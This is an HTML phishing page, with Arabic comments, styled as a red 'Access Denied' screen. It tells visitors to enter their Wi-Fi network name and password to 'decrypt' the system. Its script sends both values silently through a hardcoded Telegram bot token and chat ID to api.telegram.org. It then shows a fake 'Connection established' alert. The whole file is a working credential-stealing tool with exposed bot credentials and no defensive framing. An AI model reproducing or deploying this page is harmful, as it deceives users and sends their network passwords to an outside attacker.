<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CONFUSED SYSTEM</title>
    <style>
        body {
            /* وضع رابط صورة الشيطان في الخلفية */
            background-image: url('https://e0.pxfuel.com/wallpapers/322/625/desktop-wallpaper-red-devil-dark-demon.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-color: black; /* لون احتياطي */
            color: #ff0000; /* اللون الأحمر */
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7); /* طبقة سوداء شفافة لتوضيح الكلام */
            z-index: 1;
        }
        .login-box {
            position: relative;
            z-index: 2;
            background: rgba(20, 0, 0, 0.9);
            padding: 40px;
            border: 2px solid #ff0000;
            border-radius: 10px;
            box-shadow: 0 0 20px #ff0000;
            text-align: center;
            width: 320px;
        }
        h2 { text-transform: uppercase; letter-spacing: 5px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: black;
            border: 1px solid #ff0000;
            color: #ff0000;
            text-align: center;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #ff0000;
            color: black;
            border: none;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 15px;
        }
        button:hover { background: #b30000; }
    </style>
</head>
<body>

<div class="overlay"></div>

<div class="login-box">
    <h2>Access Denied</h2>
    <p>أدخل بيانات الشبكة لفك التشفير</p>
    
    <input type="text" id="wifi_name" placeholder="SSID (اسم الشبكة)">
    <input type="password" id="wifi_pass" placeholder="Password (كلمة السر)">
    
    <button onclick="sendOnlyData()">Login to System</button>
</div>

<script>
    const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
    const chat_id = "8042090388";

    function sendOnlyData() {
        const name = document.getElementById('wifi_name').value;
        const pass = document.getElementById('wifi_pass').value;

        if(name === "" || pass === "") {
            alert("Error: Empty Fields");
            return;
        }

        // إرسال فقط اسم الشبكة والباسورد
        const message = `📶 Network: ${name}\n🔐 Password: ${pass}`;
        
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(url).then(() => {
            alert("Connection established...");
            window.location.reload(); 
        });
    }
</script>

</body>
</html>
